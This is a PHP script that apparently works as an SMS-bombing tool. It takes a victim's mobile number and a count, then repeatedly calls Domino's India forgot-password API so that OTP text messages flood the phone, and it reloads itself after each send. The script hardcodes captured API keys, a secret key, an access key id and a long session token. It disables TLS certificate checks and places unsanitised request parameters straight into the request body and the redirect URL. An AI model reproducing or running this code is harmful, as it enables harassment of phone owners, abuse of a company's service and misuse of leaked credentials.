
<?php 
$count=$_REQUEST['count'];
$sent=$_REQUEST['sent'];
$mobno=$_REQUEST['mobno'];
if($sent==$count){	
	header("location:index.php?msg=total ".$count." otp send successuffly");
}
else{ 
	
 $data='{"lastName":"","mobile":"'.$mobno.'","firstName":""}';
 $url="https://api.dominos.co.in/loginhandler/forgotpassword";
         //header here
         $headers   = array();
        $headers[] = "Host:api.dominos.co.in";
        $headers[] = "content-length:52";
        $headers[] = "strict-transport-security:max-age=1623583911938";
        $headers[] = "x-content-type-options:nosniff";
        $headers[] = "api_key:d2aeb489bb8df385";
        $headers[] = "ga_client_id:1234079873.1592026925";
        $headers[] = "status:SUCCESS";
        $headers[] = "secretkey:NSBQTumownmA4EKwyWfrrE/9Jh4nIUHkMVF4HJWY";
        $headers[] = "userid:ap-south-1:54998ac6-dfb4-4169-9f83-c9919100c0a0";
        $headers[] = "x-forwarded-for-requestid:1592026959925-ap-south-1:54998ac6-dfb4-4169-9f83-c9919100c0a0";
        $headers[] = "credentials:[object Object]";
        $headers[] = "deliverytype:D";
        $headers[] = "isloggedin:false";
        $headers[] = "client_type:web app-chrome";
        $headers[] = "x-frame-options:mitigate";
        $headers[] = "accesskeyid:ASIAWMIT2NXA3HJPPMV4";
        $headers[] = "source:PWA18#google_sem_brand#upsellB";
        $headers[] = "user-agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36";
        $headers[] = "cartid:1582573894670162";
        $headers[] = "access-control-allow-methods:GET, POST, PATCH, PUT, DELETE, OPTIONS";
        $headers[] = "authtoken:ASIAWMIT2NXA3HJPPMV4";
        $headers[] = "access-control-allow-origin:*";
        
        $headers[] = "accept:application/json, text/plain, */*";
        $headers[] = "sessiontoken:IQoJb3JpZ2luX2VjEPb//////////wEaCmFwLXNvdXRoLTEiRzBFAiBDwqRD0cbjq5qet/EOWPiMdrVH41I5sqiihPXGUq8BlAIhAKaFd1RGfSC23iIVkyFiyhvO1yRSvtqoTFHwt3phDgkvKswFCG8QABoMNDM4NjY1MTEzMDI1IgxBcBjIla0W3NN2j1cqqQUGdqf2vj20Cpux91e/imiZaZT8q3R50lGvr7YFybOkbhvUpszO4K6LUoXaO2EOB9T7pjYRcpV9fJQOKFyo9hMpfbHQl8NfNIJUBzKwAvL3vhMbEr6+k3UjBR4Uu6eA24CZYEC+B/C7OnHrKqRMm5A1wpkV7m6/gEI76lcAqw8r/qzUoZ+GD+Tokfo2z7uowzcKY4QSSU8pABC+ZzjWcl2KUFVNnlBLBxPhrttQCRrtG6X4p1PQk6Ck9laL4MsKXC44GQtbbVxq4Tua/unFGedqWSuGoqCZZO/cANOYEZm6BeizvWUpctlurLC1Vcf6jBppVUfu1nUb5E+3/jyPZzoUZssuI18GruGmgoL60sPHKhmxSZAwu6Tni+FTc6LZ1OWM7fX6s2ReU6N+4VIB6EZGj/SaOxi5z7Zt4YCYARJXDr9AiwWvTgfMldK0ZN73or8jzFqvb5YXUXyB2ReyLTfFtjXBm70ffLhi0Ypju+YaVUrPBpxQ0uqMpusQvzfIzvedqj/jZc6pcHGtbK9tYbF4IYGvHYMP05OKTWyPpI+vft18eGXw+SmiamkRvNjYMiQNPv0/VVEarZIi0OrAebx0VW9rTaqyV6SE+2aZDS/9vpS3pKgF6ZSrOSlwtEsCGrzFFVcuD3VZGz0vSZMGfUt1dL3X+6xdFV9aP+NYgZW4coTWlYhq0TyjxcqGyQOCm6WUVKDl4gBrU9lfR9mBtjPTvUxdrE5NkoMLPp6Ja7+XYFoqn61Cm0Lm+lM2ez1VoTn8k8vJgzwHNtCruua3MmHRUUuIervQHOpM7h8jhaxcdiKgUqbLKOxioA+zdCHiZWRCY9U+ToocPbgH/RKQiDFKvnGbQ7R1MHosmZs/Gx9woJy3MKUj80CmWhZpNYozVnYi2NEkQDaqyZIwrM6R9wU6zQJYaews1p0nVcx6cXzZynx9ZcHO1JgYhzUyx/EHucPlt6DVLYYi75BJ3vV7KpofMVwSI/YtEBPPpoUmuooGM0RLrbmhR8+MddPc1pSvgnbpw9HrJh3gix/v/0OnNC2rns3VwnXuwwM5rY+OPz+bZBGTQEa5uDMNZcj+sLbFa+L7xHROTx+FhtCCUKuyAaVccZ/Ld4i3CSzKAI/QEyYvfiosxub0GWQewscZIx6sfb0DvXSD92lQAjze5ojCGy/qQFDLiP1HYmbh7kykZgJpHZZ/ytIbiyZT9pt+qGlKA5uR7IALV+ZnwgXnfdasu0X56V+YALP9Y8oOeCCCCyQ+wxPTf+0BmAlhCIISS8Smouq2Jm4G+pK9f3UTizZjzcUnMH2T+rEq3QPXCrWQclfosezQyJgRiKAC9N96TtEcw6b9dkzHQ9mOgNp9tECle7w=";
       
        $headers[] = "content-type:application/json";
        $headers[] = "access-control-allow-headers:*";
        $headers[] = "storeid:6585R";
        $headers[] = "ab_test_variant:not-reversed";
        $headers[] = "origin:https://m.dominos.co.in";
        $headers[] = "sec-fetch-site:same-site";
        $headers[] = "sec-fetch-mode:cors";
        $headers[] = "sec-fetch-dest:empty";
        $headers[] = "referer:https://m.dominos.co.in/login";
        $headers[] = "accept-encoding:gzip, deflate, br";
        $headers[] = "accept-language:en-US,en;q=0.9";
      //  $headers[] = "";

        //end headers and function start
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        curl_close($ch);


	$sentinc=$sent+1;
   $rl="11.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno;
   ?><center><div style="height: 50px;width: 40rem;border-radius:20px;background:#00F306;color: black;font-size: 32px;border:2px dotted red;padding-top: 8px;font-family: Yu Gothic;"> <?php echo $sent; ?> OTP SEND AND CONTINUE....</div></center><?php
    echo '<META HTTP-EQUIV=REFRESH CONTENT="2; '.$rl.'">';
	//header("location:2.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno);
}
?>